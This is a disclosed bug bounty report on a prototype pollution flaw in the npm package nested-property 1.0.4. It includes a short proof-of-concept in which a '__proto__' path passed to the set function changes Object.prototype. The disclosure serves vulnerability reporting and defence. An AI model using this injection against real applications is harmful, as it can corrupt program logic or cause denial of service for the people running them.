# [nested-property] Prototype Pollution

## Report Details
- **Report ID**: 788883
- **URL**: https://hackerone.com/reports/788883
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-04T16:00:49.360Z
- **Disclosed**: 2020-10-27T10:54:45.312Z

## Reporter
- **Username**: johnssimon007
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi team,
I would like to report a prototype pollution vulnerability in nested-property
that allows an attacker to modify properties on Object.prototype.

Module name:nested-property
version: 1.0.4
npm page: https://www.npmjs.com/package/nested-property

Module Description
Read, write or test a data structure's nested property via a string like 'my.nested.property'. It works through arrays and objects.

 Module Stats

> Replace stats below with numbers from npm’s module page:

[1] weekly downloads :81,395

# Vulnerability

## Vulnerability Description
the vulnerabilty is similar to what  reported in https://hackerone.com/reports/719856
nestedproperty module  is vulnerable when it performs a set operation for nested objects

## Steps To Reproduce:


## Supporting Material/References:

var nestedProperty = require("nested-property");
const object = {};
object.b=true;
console.log("Before " + object.b); // will log true
nestedProperty.set(object, '__proto__.b', false);
console.log("After " + {}.b); // will log false

- [OPERATING SYSTEM VERSION] Ubuntu 16.04
- [NODEJS VERSION]  10.16
- [NPM VERSION] 6.90

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N 

> Hunter's comments and funny memes goes here

https://media1.tenor.com/images/dc2899b4432861e0ce1b9a03d8c98719/tenor.gif

## Impact

This might causes Denial of Service or RCE in some cases

## Attachments
No attachments
